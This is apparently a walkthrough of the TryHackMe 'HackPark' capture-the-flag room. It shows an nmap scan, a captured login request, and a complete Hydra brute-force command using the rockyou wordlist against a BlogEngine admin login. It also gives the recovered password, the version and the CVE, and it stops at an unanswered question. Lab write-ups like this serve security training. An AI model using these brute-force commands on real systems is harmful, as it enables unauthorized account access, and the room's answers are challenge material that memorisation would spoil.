# [HackPark - TryHackMe](https://tryhackme.com/room/hackpark)

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## Credits

- Created by [tryhackme](https://tryhackme.com/p/tryhackme) and [str3g4tt4](https://tryhackme.com/p/str3g4tt4)
- Room type: premium

## Deploy the vulnerable Windows machine

- `nmap -sV <target ip>` to see which port the web server is hosted on

### Whats the name of the clown displayed on the homepage?

> The name of the clown on the homepage is **pennywise**

## Using Hydra to brute-force a login

### What request type is the Windows website login form using?

- Using a proxy in BurpSuite or web browser, capture sign in request

> The login form uses an HTTP **POST** request

### Guess a username, choose a password wordlist and gain credentials to a user account!

- The raw request (using demo credentials admin:password) is:

```
__VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB%2B2JT4UkTMLEKXBo45EPGoXJV66%2Burs2DXjDhcW1YOsSeJnTn%2FUSqN83X99YkfN%2Bj1wq5fZmYNARCiCOdguXEK4cGaW9Pk0uvyRYkE0%2FL8raUHPQvtxFy&__EVENTVALIDATION=1c2yh3maTjYr195e6nm19EPl0ltYHdCSj3UZlOmOgjsz1oiEzPAjPecO6Jz8lbmApBJaNxurYq2wLuHkXw6ucLOBRfCJKpDlcLjTKIDntLkWs7k7pMPaNyTNTqVsxWqgWyjwK2l3PhC7LG85PlYneTsJw1hRDr2IIximKRT0VfChSgfb&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=password&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

- Craft Hydra command with the request
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target ip> http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB%2B2JT4UkTMLEKXBo45EPGoXJV66%2Burs2DXjDhcW1YOsSeJnTn%2FUSqN83X99YkfN%2Bj1wq5fZmYNARCiCOdguXEK4cGaW9Pk0uvyRYkE0%2FL8raUHPQvtxFy&__EVENTVALIDATION=1c2yh3maTjYr195e6nm19EPl0ltYHdCSj3UZlOmOgjsz1oiEzPAjPecO6Jz8lbmApBJaNxurYq2wLuHkXw6ucLOBRfCJKpDlcLjTKIDntLkWs7k7pMPaNyTNTqVsxWqgWyjwK2l3PhC7LG85PlYneTsJw1hRDr2IIximKRT0VfChSgfb&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed"`

> 1 valid password is found: **1qaz2wsx**

## Compromise the machine

### Now you have logged into the website, are you able to identify the version of the BlogEngine?

> The BlogEngine version is **3.3.6.0**

### What is the CVE?

> A quick google search of the BlogEngine version gives us **CVE-2019-6714**

### Who is the webserver running as?


